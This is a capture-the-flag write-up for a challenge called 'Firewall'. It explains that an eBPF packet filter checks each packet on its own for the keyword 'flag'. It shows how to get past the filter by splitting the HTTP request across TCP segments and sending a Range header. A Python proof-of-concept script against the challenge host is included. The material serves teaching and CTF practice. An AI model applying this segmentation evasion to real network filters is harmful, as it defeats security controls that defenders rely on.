<style> :root { color-scheme: dark; --bg: #020617; --fg: #e5e7eb; --fg-muted: #9ca3af; --accent: #38bdf8; --border-subtle: #1f2937; } /* Base page */ html, body { margin: 0; padding: 0; background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%); color: var(--fg); font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif; } /* GitHub Pages wrappers */ .page-content, .wrapper, article, .post { background: transparent !important; max-width: 960px; margin: 0 auto; padding: 2.5rem 1.5rem 4rem; } /* Headings */ .post h1, .page-content h1, article h1 { font-size: 1.6rem; margin-bottom: 0.6rem; } .post h2, .page-content h2, article h2 { font-size: 1.1rem; margin-top: 1.8rem; margin-bottom: 0.6rem; color: var(--fg-muted); } /* Tables (optional, if you use them) */ table { border-collapse: collapse; width: 100%; font-size: 0.85rem; margin: 0.4rem 0 0.8rem; border-radius: 0.6rem; overflow: hidden; } th, td { padding: 0.5rem 0.75rem; border-bottom: 1px solid var(--border-subtle); background-color: rgba(15, 23, 42, 0.9); } th { text-align: left; font-weight: 500; color: var(--fg-muted); } tbody tr:nth-child(even) td { background-color: rgba(15, 23, 42, 0.75); } tbody tr:last-child td { border-bottom: none; } /* Links */ a { color: var(--accent); } a:hover { text-decoration: none; } /* Code blocks */ pre, code, pre code, .highlight, .highlight pre, .highlight code { background-color: rgba(15, 23, 42, 0.96) !important; color: var(--fg); } pre { border: 1px solid var(--border-subtle); padding: 0.85rem 1rem; border-radius: 0.5rem; overflow-x: auto; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } code { padding: 0.1rem 0.25rem; border-radius: 0.25rem; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } </style>

# Firewall — Writeup

## Summary
The eBPF tc filter scans each TCP packet payload for the lowercase keyword `flag`
and the character `%`. It does not perform TCP stream reassembly. By splitting
`flag` across packets and requesting only a byte range of `/flag.html` that
contains the flag but not the lowercase keyword, we can retrieve the flag.

## Key Observations
- The filter runs on both ingress and egress (`tc/ingress` attached twice).
- It scans *each packet* for `flag` and `%` only, and drops matching packets.
- It does not inspect or reassemble full HTTP/TCP streams.
- `/flag.html` contains the flag. The response body contains the text
  `Here is your free flag: TEST{FLAG}`.

## Why It Works
1) **Request bypass**: Send `GET /fl` and `ag.html` in separate TCP packets so
   no single packet contains the substring `flag`.
2) **Response bypass**: Use `Range: bytes=135-` to start the response at the
   `TEST{FLAG}` portion. That response chunk contains no lowercase `flag`, so
   the egress filter allows it.

## Exploit Steps
1. Open a TCP connection to the service.
2. Send the HTTP request in two TCP segments to split `flag`.
3. Include a `Range` header to avoid the lowercase keyword in the response.
4. Read the response body to get the flag.

## Proof of Concept
```python
import socket, time

host, port = "35.227.38.232", 5000
s = socket.create_connection((host, port), timeout=5)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

# Split "flag" across packets
s.sendall(b"GET /fl")
time.sleep(0.2)
s.sendall(
    b"ag.html HTTP/1.1\r\n"
    b"Host: 35.227.38.232\r\n"
    b"Range: bytes=135-\r\n"
    b"Connection: close\r\n\r\n"
)

resp = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    resp += chunk
s.close()

print(resp.decode("latin1", errors="replace"))
```

## Flag
`uoftctf{f1rew4l1_Is_nOT_par7icu11rLy_R0bust_I_bl4m3_3bpf}`
